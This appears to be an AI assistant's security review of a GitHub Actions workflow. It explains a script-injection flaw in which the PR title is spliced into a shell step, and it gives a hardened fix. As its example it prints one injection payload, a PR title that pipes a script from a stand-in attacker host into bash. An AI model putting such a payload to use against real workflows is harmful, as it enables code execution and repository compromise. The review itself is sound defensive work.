I found the workflow: `.github/workflows/deploy.yml`, line 14:

```yaml
- run: echo "Title is ${{ github.event.pull_request.title }}"
```

**This is not safe.** `${{ }}` expressions are substituted into the `run:` script as raw text *before* the shell runs it — the PR title is fully attacker-controlled (anyone opening a PR sets it). A title like:

```
"; curl https://evil.example/x | bash #
```

gets spliced directly into the shell command, turning it into arbitrary code execution on the runner. Worse, this workflow also has `permissions: write-all` at the workflow level, so that injected code would run with a token that can push code, create releases, etc. — a full repo compromise, not just a leaked echo.

The fix is to pass the value through `env:` (which goes through the process environment, not string substitution) and reference it as a quoted shell variable:

```yaml
---
name: deploy

on:
  pull_request:

permissions: {}

jobs:
  deploy:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    permissions:
      contents: read
    steps:
      - uses: actions/checkout@<SHA> # v4.x.x
        with:
          persist-credentials: false
      - name: Show PR title
        env:
          PR_TITLE: ${{ github.event.pull_request.title }}
        run: echo "Title is $PR_TITLE"
```

Other baseline issues on this same file while I'm in it: `permissions: write-all` should be dropped to `permissions: {}` at workflow level with `contents: read` on the job, `actions/checkout@v4` should be pinned to a commit SHA rather than a mutable tag, and the job needs a `timeout-minutes`.

I can't apply this edit or resolve the current `actions/checkout` release SHA in this session — my toolset right now is read-only (no file-write/Bash access), so I can't run `gh api` to pin the SHA or run `actionlint`/`zizmor` to verify. Want me to proceed once I have write access, or would you like to apply the diff above yourself (swapping `<SHA>` for the real pinned commit)?
